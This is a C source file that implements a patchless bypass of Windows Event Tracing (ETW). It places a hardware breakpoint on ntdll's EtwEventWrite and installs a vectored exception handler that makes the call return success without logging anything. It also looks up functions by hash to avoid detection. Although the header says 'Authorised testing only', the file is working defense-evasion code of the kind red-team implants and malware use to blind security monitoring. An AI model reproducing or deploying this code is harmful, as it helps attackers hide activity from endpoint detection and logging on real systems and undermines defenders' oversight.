/* etw_hwbp.c -- patchless ETW bypass via Dr1 + VEH on EtwEventWrite
 *
 * Authorised testing only.
 */
#include <windows.h>
#include "veh_manager.h"
#include "helpers.h"
#include "../include/bypass.h"

static const int ETW_DR = 1;
static BOOL g_etw_installed = FALSE;

static LONG NTAPI etw_handler(EXCEPTION_POINTERS *exc, PVOID target, PVOID user_ctx)
{
    (void)target; (void)user_ctx;
    CONTEXT *c = exc->ContextRecord;
    c->Rax = 0;  /* STATUS_SUCCESS */
    DWORD64 ret_addr = *(DWORD64 *)c->Rsp;
    c->Rip = ret_addr;
    c->Rsp += 8;
    return EXCEPTION_CONTINUE_EXECUTION;
}

bp_result_t bp_etw_hwbp_install(void)
{
    if (g_etw_installed) return BP_OK;
    PVOID ntdll = bp_get_module_by_hash(HASH_NTDLL);
    if (!ntdll) return BP_ERR_ETW_NOT_FOUND;
    PVOID etw_event_write = bp_get_proc_by_hash(ntdll, bp_fnv1a("EtwEventWrite"));
    if (!etw_event_write) return BP_ERR_ETW_NOT_FOUND;
    if (!bp_veh_install(ETW_DR, etw_event_write, etw_handler, NULL))
        return BP_ERR_SET_CONTEXT;
    g_etw_installed = TRUE;
    return BP_OK;
}

void bp_etw_hwbp_uninstall(void)
{
    if (!g_etw_installed) return;
    bp_veh_uninstall(ETW_DR);
    g_etw_installed = FALSE;
}
